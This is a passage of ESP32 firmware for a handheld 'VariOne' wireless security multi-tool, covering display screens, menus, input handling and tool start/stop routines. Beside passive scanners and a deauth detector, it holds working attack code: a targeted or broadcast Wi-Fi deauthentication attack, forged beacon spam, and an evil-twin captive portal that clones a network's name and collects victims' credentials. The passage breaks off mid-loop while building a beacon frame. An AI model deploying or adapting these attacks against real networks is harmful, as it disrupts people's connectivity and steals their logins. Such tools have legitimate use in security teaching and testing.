  webServer.on("/ncsi.txt",                  HTTP_GET, etRedirect);
  webServer.on("/redirect",                  HTTP_GET, etRedirect);
  webServer.onNotFound(etRedirect);
  webServer.begin();
}

// ============================================================
// DRAWING HELPERS
// ============================================================

void drawHeader(const char* title) {
  display.setFont(u8g2_font_7x13B_tr);
  display.drawStr(2, 12, title);
  display.drawHLine(0, 15, 128);
}

void drawControls(const char* text) {
  display.setFont(u8g2_font_5x7_tr);
  display.drawStr(2, 63, text);
}

// ============================================================
// SCREEN DRAW FUNCTIONS
// ============================================================

void drawMenu() {
  display.clearBuffer();
  // Small mascot in top-left corner of menu
  display.setFont(u8g2_font_7x13B_tr);
  display.drawStr(28, 12, "VariOne v0.4");
  display.drawHLine(0, 15, 128);
  display.setFont(u8g2_font_6x10_tr);
  int startIdx = (menuIndex >= 3) ? menuIndex - 2 : 0;
  for (int i = 0; i < 3; i++) {
    int idx = startIdx + i;
    if (idx >= menuCount) break;
    int y = 28 + (i * 14);
    if (idx == menuIndex) {
      display.drawBox(0, y - 10, 128, 13);
      display.setDrawColor(0);
      display.drawStr(6, y, menuItems[idx]);
      display.setDrawColor(1);
    } else {
      display.drawStr(6, y, menuItems[idx]);
    }
  }
  drawControls("up/dn:nav  ok:sel  bk:back");
  display.sendBuffer();
}

void drawWifiResults() {
  display.clearBuffer();
  char hdr[24]; snprintf(hdr,sizeof(hdr),"WiFi (%d)",wifiCount);
  drawHeader(hdr);
  if (wifiCount == 0) {
    display.setFont(u8g2_font_6x10_tr);
    display.drawStr(10, 40, "No networks found");
    display.sendBuffer(); return;
  }
  display.setFont(u8g2_font_5x8_tr);
  for (int i = 0; i < 4; i++) {
    int idx = wifiScroll + i;
    if (idx >= wifiCount) break;
    const char* lock = (wifiNets[idx].encryption != WIFI_AUTH_OPEN) ? "*" : " ";
    String name = wifiNets[idx].ssid;
    if (!name.length()) name = "(hidden)";
    if (name.length() > 12) name = name.substring(0,11) + "~";
    char line[32];
    snprintf(line,sizeof(line),"%s%-12s %ddB ch%d",lock,name.c_str(),wifiNets[idx].rssi,wifiNets[idx].channel);
    display.drawStr(2, 27+(i*11), line);
  }
  drawControls("up/dn:scroll  bk:back");
  display.sendBuffer();
}

void drawPacketMonitor() {
  display.clearBuffer();
  char hdr[28]; snprintf(hdr,sizeof(hdr),"PktMon: %d pkts",totalPackets);
  drawHeader(hdr);
  int graphY=17,graphH=38,barW=8,maxPkts=1;
  for (int ch=1;ch<=14;ch++) {
    if(channelPackets[ch]>maxPkts) maxPkts=channelPackets[ch];
    if(channelPeaks[ch]>maxPkts) maxPkts=channelPeaks[ch];
  }
  for (int ch=1;ch<=14;ch++) {
    int x=(ch-1)*9+2;
    int barH=constrain(map(channelPackets[ch],0,maxPkts,0,graphH),0,graphH);
    display.drawBox(x,graphY+graphH-barH,barW,barH);
    int peakH=map(channelPeaks[ch],0,maxPkts,0,graphH);
    if(peakH>0) display.drawHLine(x,graphY+graphH-peakH,barW);
    if(channelPackets[ch]>channelPeaks[ch]) channelPeaks[ch]=channelPackets[ch];
  }
  display.setFont(u8g2_font_4x6_tr);
  for (int ch=1;ch<=14;ch++) {
    char num[3]; snprintf(num,sizeof(num),"%d",ch);
    display.drawStr((ch-1)*9+3,62,num);
  }
  display.sendBuffer();
}

void drawProbeSniffer() {
  display.clearBuffer();
  char hdr[24]; snprintf(hdr,sizeof(hdr),"Probes (%d)",probeCount);
  drawHeader(hdr);
  if (probeCount == 0) {
    display.setFont(u8g2_font_6x10_tr); display.drawStr(8,35,"Listening...");
    display.setFont(u8g2_font_5x8_tr);  display.drawStr(8,48,"Waiting for probes");
    drawControls("bk:stop"); display.sendBuffer(); return;
  }
  display.setFont(u8g2_font_5x8_tr);
  for (int i=0;i<4;i++) {
    int idx=probeScroll+i; if(idx>=probeCount) break;
    char line[32];
    snprintf(line,sizeof(line),"%02X:%02X>%-16s",probes[idx].mac[4],probes[idx].mac[5],probes[idx].ssid);
    display.drawStr(2,27+(i*11),line);
  }
  drawControls("up/dn:scroll  bk:stop");
  display.sendBuffer();
}

void drawDeauthDetector() {
  display.clearBuffer(); drawHeader("Deauth Detector");
  display.setFont(u8g2_font_6x10_tr);
  char stat[28]; snprintf(stat,sizeof(stat),"Monitoring: %lus",(millis()-deauthStart)/1000);
  display.drawStr(4,28,stat);
  if (deauthCount > 0) {
    display.setFont(u8g2_font_helvB12_tr);
    char alert[20]; snprintf(alert,sizeof(alert),"!! %d !!",deauthCount);
    int w=display.getStrWidth(alert); display.drawStr((128-w)/2,46,alert);
    display.setFont(u8g2_font_5x8_tr); display.drawStr(20,56,"DEAUTH DETECTED!");
  } else {
    display.setFont(u8g2_font_6x10_tr); display.drawStr(20,42,"All clear");
    char pkts[24]; snprintf(pkts,sizeof(pkts),"%d frames checked",totalMonitored);
    display.setFont(u8g2_font_5x8_tr); display.drawStr(10,54,pkts);
  }
  drawControls("bk:stop"); display.sendBuffer();
}

void drawDeauthTargetSelect() {
  display.clearBuffer(); drawHeader("Pick Target AP");
  if (wifiCount == 0) {
    display.setFont(u8g2_font_6x10_tr); display.drawStr(4,35,"No scan data!");
    display.setFont(u8g2_font_5x8_tr);  display.drawStr(4,50,"Run WiFi Scanner first");
    drawControls("bk:back"); display.sendBuffer(); return;
  }
  display.setFont(u8g2_font_5x8_tr);
  for (int i=0;i<4;i++) {
    int idx=deauthTargetScroll+i; if(idx>=wifiCount) break;
    int y=27+(i*11);
    String name=wifiNets[idx].ssid; if(!name.length()) name="(hidden)";
    if(name.length()>14) name=name.substring(0,13)+"~";
    if (idx==deauthTargetIdx) {
      display.drawBox(0,y-8,128,10); display.setDrawColor(0);
      char line[32]; snprintf(line,sizeof(line),">%-14s ch%d",name.c_str(),wifiNets[idx].channel);
      display.drawStr(2,y,line); display.setDrawColor(1);
    } else {
      char line[32]; snprintf(line,sizeof(line)," %-14s ch%d",name.c_str(),wifiNets[idx].channel);
      display.drawStr(2,y,line);
    }
  }
  drawControls("up/dn:nav ok:scan bk:back"); display.sendBuffer();
}

void drawClientScan() {
  display.clearBuffer(); drawHeader("Finding Clients");
  String name=wifiNets[deauthTargetIdx].ssid; if(!name.length()) name="(hidden)";
  if(name.length()>18) name=name.substring(0,17)+"~";
  display.setFont(u8g2_font_5x8_tr); display.drawStr(4,26,name.c_str());
  unsigned long elapsed=millis()-clientScanStart;
  int progress=map(constrain(elapsed,0,CLIENT_SCAN_MS),0,CLIENT_SCAN_MS,0,120);
  display.drawFrame(4,32,120,10); display.drawBox(4,32,progress,10);
  char found[24]; snprintf(found,sizeof(found),"Found: %d client(s)",clientCount);
  display.setFont(u8g2_font_5x8_tr); display.drawStr(4,54,found);
  drawControls("bk:skip"); display.sendBuffer();
}

void drawClientSelect() {
  display.clearBuffer(); drawHeader("Pick Client");
  int totalRows=clientCount+1;
  display.setFont(u8g2_font_5x8_tr);
  for (int i=0;i<4;i++) {
    int idx=clientSelectScroll+i; if(idx>=totalRows) break;
    int y=27+(i*11); char line[32];
    if(idx==0) snprintf(line,sizeof(line)," All Clients (%d)",clientCount);
    else { int ci=idx-1; snprintf(line,sizeof(line)," %02X:%02X:%02X:%02X:%02X:%02X",clients[ci].mac[0],clients[ci].mac[1],clients[ci].mac[2],clients[ci].mac[3],clients[ci].mac[4],clients[ci].mac[5]); }
    if(idx==clientSelectIdx) {
      display.drawBox(0,y-8,128,10); display.setDrawColor(0);
      line[0]='>'; display.drawStr(2,y,line); display.setDrawColor(1);
    } else display.drawStr(2,y,line);
  }
  drawControls("up/dn:nav ok:atk bk:back"); display.sendBuffer();
}

void drawDeauthAttack() {
  display.clearBuffer(); drawHeader("Deauth Attack");
  String name=wifiNets[deauthTargetIdx].ssid; if(!name.length()) name="(hidden)";
  if(name.length()>16) name=name.substring(0,15)+"~";
  display.setFont(u8g2_font_5x8_tr); display.drawStr(4,26,name.c_str());
  if(attackTargetAll) { display.drawStr(4,37,">> All clients"); }
  else {
    char mac[22]; snprintf(mac,sizeof(mac),">>%02X:%02X:%02X:%02X:%02X:%02X",attackClientMAC[0],attackClientMAC[1],attackClientMAC[2],attackClientMAC[3],attackClientMAC[4],attackClientMAC[5]);
    display.drawStr(2,37,mac);
  }
  display.setFont(u8g2_font_helvB12_tr);
  char fc[20]; snprintf(fc,sizeof(fc),"%d frm",deauthFrameCount);
  int w=display.getStrWidth(fc); display.drawStr((128-w)/2,56,fc);
  drawControls("bk:stop"); display.sendBuffer();
}

void drawBeaconSpam() {
  display.clearBuffer(); drawHeader("Beacon Spam");
  display.setFont(u8g2_font_5x8_tr);
  char ssidLine[24]; snprintf(ssidLine,sizeof(ssidLine),"%.22s",spamSSIDs[beaconSSIDIdx]);
  display.drawStr(2,27,ssidLine);
  char idxLine[24]; snprintf(idxLine,sizeof(idxLine),"SSID %d/%d  ch%d",beaconSSIDIdx+1,spamSSIDCount,beaconChannels[beaconChannelIdx]);
  display.drawStr(2,38,idxLine);
  display.setFont(u8g2_font_helvB12_tr);
  char fc[20]; snprintf(fc,sizeof(fc),"%d sent",beaconFrameCount);
  int w=display.getStrWidth(fc); display.drawStr((128-w)/2,56,fc);
  drawControls("bk:stop"); display.sendBuffer();
}

void drawEvilTwinTarget() {
  display.clearBuffer(); drawHeader("Evil Twin: Pick AP");
  if (wifiCount == 0) {
    display.setFont(u8g2_font_6x10_tr); display.drawStr(4,35,"No scan data!");
    display.setFont(u8g2_font_5x8_tr);  display.drawStr(4,50,"Run WiFi Scanner first");
    drawControls("bk:back"); display.sendBuffer(); return;
  }
  display.setFont(u8g2_font_5x8_tr);
  for (int i=0;i<4;i++) {
    int idx=etTargetScroll+i; if(idx>=wifiCount) break;
    int y=27+(i*11);
    String name=wifiNets[idx].ssid; if(!name.length()) name="(hidden)";
    if(name.length()>14) name=name.substring(0,13)+"~";
    if(idx==etTargetIdx) {
      display.drawBox(0,y-8,128,10); display.setDrawColor(0);
      char line[32]; snprintf(line,sizeof(line),">%-14s ch%d",name.c_str(),wifiNets[idx].channel);
      display.drawStr(2,y,line); display.setDrawColor(1);
    } else {
      char line[32]; snprintf(line,sizeof(line)," %-14s ch%d",name.c_str(),wifiNets[idx].channel);
      display.drawStr(2,y,line);
    }
  }
  drawControls("up/dn:nav ok:start bk:back"); display.sendBuffer();
}

void drawEvilTwinRunning() {
  display.clearBuffer(); drawHeader("Evil Twin");
  display.setFont(u8g2_font_5x8_tr);
  String name=wifiNets[etTargetIdx].ssid; if(!name.length()) name="(hidden)";
  if(name.length()>18) name=name.substring(0,17)+"~";
  display.drawStr(2,26,name.c_str());
  char info[24]; snprintf(info,sizeof(info),"192.168.4.1  ch%d",wifiNets[etTargetIdx].channel);
  display.drawStr(2,36,info);
  if(etCredCount==0) { display.drawStr(2,47,"Waiting..."); }
  else { char cl[24]; snprintf(cl,sizeof(cl),"Creds:%d | %s",etCredCount,etLastUser); display.drawStr(2,47,cl); }
  char cts[24]; snprintf(cts,sizeof(cts),"Clients: %d",WiFi.softAPgetStationNum());
  display.drawStr(2,57,cts);
  drawControls("bk:stop"); display.sendBuffer();
}

void drawPlaceholder(const char* title, const char* msg) {
  display.clearBuffer(); drawHeader(title);
  display.setFont(u8g2_font_6x10_tr); display.drawStr(10,40,msg);
  drawControls("bk:back"); display.sendBuffer();
}

void drawNFC() {
  display.clearBuffer();
  drawHeader("NFC Reader");
  if (!nfcReady) {
    display.setFont(u8g2_font_6x10_tr); display.drawStr(4,35,"MFRC522 not found");
    display.setFont(u8g2_font_5x8_tr);  display.drawStr(4,50,"Check wiring GPIO27");
    drawControls("bk:back"); display.sendBuffer(); return;
  }
  display.setFont(u8g2_font_5x8_tr);
  if (!nfcCard.valid) {
    display.setFont(u8g2_font_6x10_tr); display.drawStr(4,28,"Hold card");
    display.drawStr(4,42,"to reader...");
    int dots = (millis()/300)%4;
    char d[5]="    "; for(int i=0;i<dots;i++) d[i]='.';
    display.setFont(u8g2_font_5x8_tr); display.drawStr(4,55,d);
  } else {
    display.setFont(u8g2_font_5x8_tr);
    // Card type (line 1)
    char line1[22];
    if (strlen(nfcCard.network) > 0)
      snprintf(line1, sizeof(line1), "%s", nfcCard.network);
    else
      snprintf(line1, sizeof(line1), "%s", nfcCard.type);
    display.drawStr(2, 27, line1);
    // Sub-type (line 2) if network found
    if (strlen(nfcCard.network) > 0)
      display.drawStr(2, 37, nfcCard.type);
    // UID (line 3)
    char uidLine[22]; snprintf(uidLine, sizeof(uidLine), "%.21s", nfcCard.uid);
    display.drawStr(2, 48, uidLine);
    display.drawStr(2, 57, "ok:clear  bk:back");
  }
  drawControls("ok:clear  bk:back");
  display.sendBuffer();
}

void drawSubGhz() {
  display.clearBuffer();

  if (!cc1101Ok) {
    drawHeader("Sub-GHz");
    display.setFont(u8g2_font_6x10_tr);
    display.drawStr(4, 35, "CC1101 not found");
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(4, 50, "Check wiring (GPIO15)");
    drawControls("bk:back");
    display.sendBuffer();
    return;
  }

  // Header with RSSI
  display.setFont(u8g2_font_5x8_tr);
  int rssi = cc1101Ok ? ELECHOUSE_cc1101.getRssi() : -99;
  char hdr[32]; snprintf(hdr, sizeof(hdr), "433MHz  RSSI:%ddBm", rssi);
  display.drawStr(2, 8, hdr);
  display.drawHLine(0, 10, 128);

  if (!sgCapture.valid) {
    // Live RSSI bar
    int rssiRaw = ELECHOUSE_cc1101.getRssi();  // typically -30 to -100
    int barW = map(constrain(rssiRaw, -100, -20), -100, -20, 0, 100);
    display.drawFrame(4, 14, 100, 7);
    display.drawBox(4, 14, barW, 7);
    char rssiStr[20]; snprintf(rssiStr, sizeof(rssiStr), "RSSI:%ddBm", rssiRaw);
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(106, 20, rssiStr[5] ? rssiStr : "");
    display.drawStr(4, 20, rssiStr);

    display.setFont(u8g2_font_6x10_tr);
    display.drawStr(4, 38, "Listening...");
    display.setFont(u8g2_font_5x8_tr);
    int nowRssi = cc1101Ok ? ELECHOUSE_cc1101.getRssi() : -99;
    char nf[32]; snprintf(nf, sizeof(nf), "Floor:%d Now:%d", sgNoiseFloor, nowRssi);
    display.drawStr(2, 50, nf);
    display.drawStr(4, 62, "Press remote now");
  } else {
    // Show pulse count
    display.setFont(u8g2_font_6x10_tr);
    char line1[32]; snprintf(line1, sizeof(line1), "Pulses: %d", sgPulseCount);
    display.drawStr(2, 22, line1);
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(2, 32, "Rolling code");
    display.drawStr(2, 41, "Waveform:");

    // Waveform
    if (sgWaveReady) {
      int waveY = 56;
      display.drawHLine(4, waveY, 120);
      for (int i = 0; i < SG_WAVE_SAMPLES; i++) {
        if (sgWave[i]) {
          display.drawPixel(4 + i, waveY - 8);
          display.drawVLine(4 + i, waveY - 8, 8);
        }
      }
    }
  }

  drawControls(sgCapture.valid ? "ok:clear  bk:exit" : "ok:arm  bk:exit");
  display.sendBuffer();
}

void drawAbout() {
  display.clearBuffer();
  // Left side: text (stays within x=0-80 to avoid mascot)
  display.setFont(u8g2_font_6x10_tr);
  display.drawStr(2, 14, "VariOne v0.4");
  display.drawStr(2, 26, "Security");
  display.drawStr(2, 38, "Multi-Tool");
  display.setFont(u8g2_font_5x8_tr);
  display.drawStr(2, 50, "CIC Cairo");
  display.drawStr(2, 60, "Dr.Ahmed Gaber");
  // Right side: mascot (cx=100, safe from text)
  drawMascot(104, 30, MOOD_HAPPY);
  display.sendBuffer();
}

// ============================================================
// TOOL FUNCTIONS
// ============================================================

void runWifiScan() {
  currentState = STATE_WIFI_SCAN;

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  WiFi.scanNetworks(true); // async — returns immediately, we animate while waiting

  unsigned long scanStart = millis();
  while (WiFi.scanComplete() < 0) {
    // Animated waving mascot during scan
    display.clearBuffer();
    drawMascot(22, 28, MOOD_WAVING);
    display.setFont(u8g2_font_6x10_tr);
    display.drawStr(50, 22, "Scanning");
    display.drawStr(50, 34, "WiFi...");
    // Animated dots
    int dots = (millis() / 400) % 4;
    char d[5] = "    ";
    for (int i = 0; i < dots; i++) d[i] = '.';
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(50, 48, d);
    display.sendBuffer();

    // Cancel on any button press or 'q' serial
    char input = readButtons();
    if (!input && Serial.available()) input = Serial.read();
    if (input == 'q' || input == 'e') {
      WiFi.scanDelete();
      WiFi.mode(WIFI_OFF);
      triggerReaction(MOOD_SAD, "Scan stopped", "going back");
      currentState = STATE_MENU;
      return;
    }

    delay(50); // ~20fps

    if (millis() - scanStart > 10000) break; // 10s timeout safety
  }

  int found = WiFi.scanComplete();
  if (found < 0) found = 0;

  wifiCount = min(found, 20);
  for (int i=0;i<wifiCount;i++) {
    wifiNets[i].ssid=WiFi.SSID(i); wifiNets[i].rssi=WiFi.RSSI(i);
    wifiNets[i].encryption=WiFi.encryptionType(i); wifiNets[i].channel=WiFi.channel(i);
    memcpy(wifiNets[i].bssid,WiFi.BSSID(i),6);
  }
  for (int i=0;i<wifiCount-1;i++)
    for (int j=i+1;j<wifiCount;j++)
      if(wifiNets[j].rssi>wifiNets[i].rssi) { WifiNetwork tmp=wifiNets[i]; wifiNets[i]=wifiNets[j]; wifiNets[j]=tmp; }
  wifiScroll=0; WiFi.scanDelete(); WiFi.mode(WIFI_OFF);

  if (wifiCount > 0) {
    char msg[22]; snprintf(msg, sizeof(msg), "Found %d APs!", wifiCount);
    triggerReaction(MOOD_HAPPY, msg, "scan complete");
  } else {
    triggerReaction(MOOD_SAD, "No networks", "try again?");
  }
  currentState = STATE_WIFI_RESULTS;
}

void startPacketMonitor() {
  memset((void*)channelPackets,0,sizeof(channelPackets));
  memset(channelPeaks,0,sizeof(channelPeaks));
  totalPackets=0; currentChannel=1; monitorActive=true;
  startPromiscuous(packetMonitorCB);
  esp_wifi_set_channel(1,WIFI_SECOND_CHAN_NONE);
  lastChannelHop=millis(); currentState=STATE_PACKET_MONITOR;
  triggerReaction(MOOD_WORKING, "Monitoring", "all channels");
}
void stopPacketMonitor() { monitorActive=false; stopPromiscuous(); currentState=STATE_MENU; }

void startProbeSniffer() {
  probeCount=0; probeScroll=0; probeActive=true;
  startPromiscuous(probeCB);
  esp_wifi_set_channel(1,WIFI_SECOND_CHAN_NONE);
  currentState=STATE_PROBE_SNIFF;
  triggerReaction(MOOD_THINKING, "Sniffing...", "listening");
}
void stopProbeSniffer() { probeActive=false; stopPromiscuous(); currentState=STATE_MENU; }

void startDeauthDetector() {
  deauthCount=0; totalMonitored=0; deauthStart=millis(); deauthActive=true;
  memset(deauthHistory,0,sizeof(deauthHistory)); deauthHistIdx=0;
  startPromiscuous(deauthCB);
  esp_wifi_set_channel(1,WIFI_SECOND_CHAN_NONE);
  currentState=STATE_DEAUTH_DETECT;
}
void stopDeauthDetector() { deauthActive=false; stopPromiscuous(); currentState=STATE_MENU; }

void enterDeauthTargetSelect() { deauthTargetIdx=0; deauthTargetScroll=0; currentState=STATE_DEAUTH_TARGET; }

void startClientScan() {
  clientCount=0; memset(clients,0,sizeof(clients));
  clientScanActive=true; clientScanStart=millis();
  startPromiscuous(clientScanCB);
  esp_wifi_set_channel(wifiNets[deauthTargetIdx].channel,WIFI_SECOND_CHAN_NONE);
  currentState=STATE_DEAUTH_CLIENT_SCAN;
  triggerReaction(MOOD_THINKING, "Finding", "clients...");
}

void finishClientScan() {
  clientScanActive=false; stopPromiscuous();
  clientSelectIdx=0; clientSelectScroll=0;
  currentState=STATE_DEAUTH_CLIENT_SELECT;
  if (clientCount > 0) {
    char msg[22]; snprintf(msg, sizeof(msg), "Found %d client(s)", clientCount);
    triggerReaction(MOOD_HAPPY, msg, "pick a target");
  } else {
    triggerReaction(MOOD_SAD, "No clients", "use broadcast?");
  }
}

void startDeauthAttack() {
  deauthFrameCount=0; deauthAttackActive=true; lastDeauthSend=0;
  if(clientSelectIdx==0||clientCount==0) { attackTargetAll=true; }
  else { attackTargetAll=false; memcpy(attackClientMAC,clients[clientSelectIdx-1].mac,6); }
  int targetCh=wifiNets[deauthTargetIdx].channel;
  WiFi.mode(WIFI_AP_STA); WiFi.softAP("v",nullptr,targetCh,1); delay(100);
  esp_wifi_set_promiscuous(true); esp_wifi_set_promiscuous_rx_cb(nullptr);
  esp_wifi_set_channel(targetCh,WIFI_SECOND_CHAN_NONE);
  currentState=STATE_DEAUTH_ATTACK;
  triggerReaction(MOOD_ANGRY, "DEAUTH!", "frames flying");
}
void stopDeauthAttack() {
  deauthAttackActive=false; esp_wifi_set_promiscuous(false);
  WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF); currentState=STATE_MENU;
}

void startBeaconSpam() {
  beaconFrameCount=0; beaconSSIDIdx=0; beaconChannelIdx=0;
  beaconSpamActive=true; lastBeaconSend=0;
  generateSpamMACs();
  WiFi.mode(WIFI_AP_STA); WiFi.softAP("v",nullptr,1,1); delay(100);
  esp_wifi_set_channel(beaconChannels[0],WIFI_SECOND_CHAN_NONE);
  currentState=STATE_BEACON_SPAM;
  triggerReaction(MOOD_HAPPY, "Beacon Spam!", "20 SSIDs");
}
void stopBeaconSpam() {
  beaconSpamActive=false; WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF); currentState=STATE_MENU;
}

void enterEvilTwinTarget() { etTargetIdx=0; etTargetScroll=0; currentState=STATE_ET_TARGET; }

void startEvilTwin() {
  etActive=true; etCredCount=0;
  memset(etLastUser,0,sizeof(etLastUser)); memset(etLastPass,0,sizeof(etLastPass));
  String ssid=wifiNets[etTargetIdx].ssid; if(!ssid.length()) ssid="FreeWiFi";
  int ch=wifiNets[etTargetIdx].channel;
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(IPAddress(192,168,4,1),IPAddress(192,168,4,1),IPAddress(255,255,255,0));
  WiFi.softAP(ssid.c_str(),nullptr,ch); delay(200);
  dnsServer.start(53,"*",IPAddress(192,168,4,1));
  etSetupWebServer();
  Serial.printf("[EVIL TWIN] SSID=%s ch=%d IP=192.168.4.1\n",ssid.c_str(),ch);
  lastEtDraw=0; currentState=STATE_ET_RUNNING;
  triggerReaction(MOOD_WORKING, "Evil Twin", "portal up!");
}
void stopEvilTwin() {
  etActive=false; webServer.stop(); dnsServer.stop();
  WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF);
  Serial.printf("[EVIL TWIN] Stopped. Creds: %d\n",etCredCount);
  currentState=STATE_MENU;
}

// ============================================================
// INPUT HANDLING
// ============================================================

void handleInput(char input) {
  switch (currentState) {
    case STATE_MENU:
      if(input=='w'&&menuIndex>0) menuIndex--;
      else if(input=='s'&&menuIndex<menuCount-1) menuIndex++;
      else if(input=='e') {
        switch(menuIndex) {
          case 0: runWifiScan(); return;
          case 1: startPacketMonitor(); return;
          case 2: startProbeSniffer(); return;
          case 3: startDeauthDetector(); return;
          case 4: enterDeauthTargetSelect(); return;
          case 5: startBeaconSpam(); return;
          case 6: enterEvilTwinTarget(); return;
          case 7: currentState=STATE_SUBGHZ; startSubGhz(); return;
          case 8: currentState=STATE_NFC; break;
          case 9: currentState=STATE_IR; break;
          case 10: currentState=STATE_ABOUT; break;
        }
      }
      break;
    case STATE_WIFI_RESULTS:
      if(input=='w'&&wifiScroll>0) wifiScroll--;
      else if(input=='s'&&wifiScroll<wifiCount-4) wifiScroll++;
      else if(input=='q') currentState=STATE_MENU;
      break;
    case STATE_PACKET_MONITOR:
      if(input=='q') stopPacketMonitor(); break;
    case STATE_PROBE_SNIFF:
      if(input=='w'&&probeScroll>0) probeScroll--;
      else if(input=='s'&&probeScroll<probeCount-4) probeScroll++;
      else if(input=='q') stopProbeSniffer();
      break;
    case STATE_DEAUTH_DETECT:
      if(input=='q') stopDeauthDetector(); break;
    case STATE_DEAUTH_TARGET:
      if(input=='w'&&deauthTargetIdx>0) { deauthTargetIdx--; if(deauthTargetIdx<deauthTargetScroll) deauthTargetScroll=deauthTargetIdx; }
      else if(input=='s'&&deauthTargetIdx<wifiCount-1) { deauthTargetIdx++; if(deauthTargetIdx>=deauthTargetScroll+4) deauthTargetScroll=deauthTargetIdx-3; }
      else if(input=='e') startClientScan();
      else if(input=='q') currentState=STATE_MENU;
      break;
    case STATE_DEAUTH_CLIENT_SCAN:
      if(input=='q') finishClientScan(); break;
    case STATE_DEAUTH_CLIENT_SELECT: {
      int totalRows=clientCount+1;
      if(input=='w'&&clientSelectIdx>0) { clientSelectIdx--; if(clientSelectIdx<clientSelectScroll) clientSelectScroll=clientSelectIdx; }
      else if(input=='s'&&clientSelectIdx<totalRows-1) { clientSelectIdx++; if(clientSelectIdx>=clientSelectScroll+4) clientSelectScroll=clientSelectIdx-3; }
      else if(input=='e') startDeauthAttack();
      else if(input=='q') currentState=STATE_MENU;
      break;
    }
    case STATE_DEAUTH_ATTACK:
      if(input=='q') stopDeauthAttack(); break;
    case STATE_BEACON_SPAM:
      if(input=='q') stopBeaconSpam(); break;
    case STATE_ET_TARGET:
      if(input=='w'&&etTargetIdx>0) { etTargetIdx--; if(etTargetIdx<etTargetScroll) etTargetScroll=etTargetIdx; }
      else if(input=='s'&&etTargetIdx<wifiCount-1) { etTargetIdx++; if(etTargetIdx>=etTargetScroll+4) etTargetScroll=etTargetIdx-3; }
      else if(input=='e') startEvilTwin();
      else if(input=='q') currentState=STATE_MENU;
      break;
    case STATE_ET_RUNNING:
      if(input=='q') stopEvilTwin(); break;
    case STATE_SUBGHZ:
      if(input=='q') { stopSubGhz(); currentState=STATE_MENU; }
      else if(input=='e') {
        if (sgCapture.valid) { sgCapture.valid=false; sgWaveReady=false; }  // clear
        else { sgArmed=true; sgArmTime=millis(); sgCapture.valid=false; sgWaveReady=false; }
      }
      break;
    case STATE_NFC:
      if(input=='q') { nfcCard.valid=false; currentState=STATE_MENU; }
      else if(input=='e') nfcCard.valid=false;  // ok: clear result
      break;
    case STATE_IR: case STATE_ABOUT:
      if(input=='q') currentState=STATE_MENU; break;
    default: break;
  }
}

// ============================================================
// SETUP + LOOP
// ============================================================

void setup() {
  Serial.begin(115200);
  Serial.println("VariOne v0.4 booting...");
  esp_log_level_set("wifi", ESP_LOG_NONE);
  pinMode(PIN_CC_CS, OUTPUT);
  digitalWrite(PIN_CC_CS, HIGH);
  initCC1101();
  initNFC();
  initSD();
  initButtons();
  display.begin();
  drawBootAnimation();   // mascot walks in + waves
  lastInputTime = millis();
  currentState = STATE_MENU;
}

void loop() {

  // === REACTION SCREEN (overrides everything for REACTION_MS) ===
  if (reactionActive) {
    if (millis() - reactionStart < REACTION_MS) {
      drawReactionScreen();
      char input = 0;
      if (Serial.available()) { char c=Serial.read(); if(c=='r') sdPrintAllCreds(); else input=c; }
      if (!input) input = readButtons();
      if (input) { lastInputTime=millis(); reactionActive=false; handleInput(input); }
      delay(30);
      return;
    } else {
      reactionActive = false;
    }
  }

  // === IDLE SLEEP (30s no input on menu) ===
  if (currentState == STATE_MENU && millis() - lastInputTime > SLEEP_TIMEOUT) {
    static unsigned long lastSleepDraw = 0;
    if (millis() - lastSleepDraw > 100) {
      display.clearBuffer();
      drawMascot(50, 30, MOOD_SLEEPING);
      display.setFont(u8g2_font_6x10_tr);
      display.drawStr(10, 8,  "z");
      display.drawStr(18, 5,  "z");
      display.drawStr(26, 2,  "Z");
      display.sendBuffer();
      lastSleepDraw = millis();
    }
    char input = 0;
    if (Serial.available()) input = Serial.read();
    if (!input) input = readButtons();
    if (input) { lastInputTime = millis(); handleInput(input); }
    delay(30);
    return;
  }

  // === BACKGROUND TASKS ===

  if (currentState==STATE_PACKET_MONITOR && monitorActive) {
    if (millis()-lastChannelHop>200) { if(++currentChannel>14) currentChannel=1; esp_wifi_set_channel(currentChannel,WIFI_SECOND_CHAN_NONE); lastChannelHop=millis(); }
    if (millis()-lastMonitorDraw>100) { drawPacketMonitor(); lastMonitorDraw=millis(); }
  }

  if (currentState==STATE_PROBE_SNIFF && probeActive) {
    static unsigned long lastProbeHop=0;
    if (millis()-lastProbeHop>500) { static int probeCh=1; if(++probeCh>14) probeCh=1; esp_wifi_set_channel(probeCh,WIFI_SECOND_CHAN_NONE); lastProbeHop=millis(); }
  }

  if (currentState==STATE_DEAUTH_DETECT && deauthActive) {
    static unsigned long lastDetectHop=0;
    if (millis()-lastDetectHop>300) { static int detectCh=1; if(++detectCh>14) detectCh=1; esp_wifi_set_channel(detectCh,WIFI_SECOND_CHAN_NONE); lastDetectHop=millis(); }
  }

  if (currentState==STATE_DEAUTH_CLIENT_SCAN && clientScanActive)
    if (millis()-clientScanStart>=CLIENT_SCAN_MS) finishClientScan();

  if (currentState==STATE_DEAUTH_ATTACK && deauthAttackActive) {
    if (millis()-lastDeauthSend>=100) {
      const uint8_t broadcast[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
      const uint8_t* dest=attackTargetAll?broadcast:attackClientMAC;
      sendDeauthFrame(wifiNets[deauthTargetIdx].bssid,dest);
      deauthFrameCount++; lastDeauthSend=millis(); drawDeauthAttack();
    }
  }

  if (currentState==STATE_BEACON_SPAM && beaconSpamActive) {
    if (millis()-lastBeaconSend>=10) {
      uint8_t ch=beaconChannels[beaconChannelIdx];
      uint8_t ssidLen=strlen(spamSSIDs[beaconSSIDIdx]);
      uint8_t frame[100]; int p=0;
      frame[p++]=0x80; frame[p++]=0x00; frame[p++]=0x00; frame[p++]=0x00;
      frame[p++]=0xFF; frame[p++]=0xFF; frame[p++]=0xFF; frame[p++]=0xFF; frame[p++]=0xFF; frame[p++]=0xFF;
      memcpy(&frame[p],spamMACs[beaconSSIDIdx],6); p+=6;
      memcpy(&frame[p],spamMACs[beaconSSIDIdx],6); p+=6;
      frame[p++]=0x00; frame[p++]=0x00;
      memset(&frame[p],0,8); p+=8;
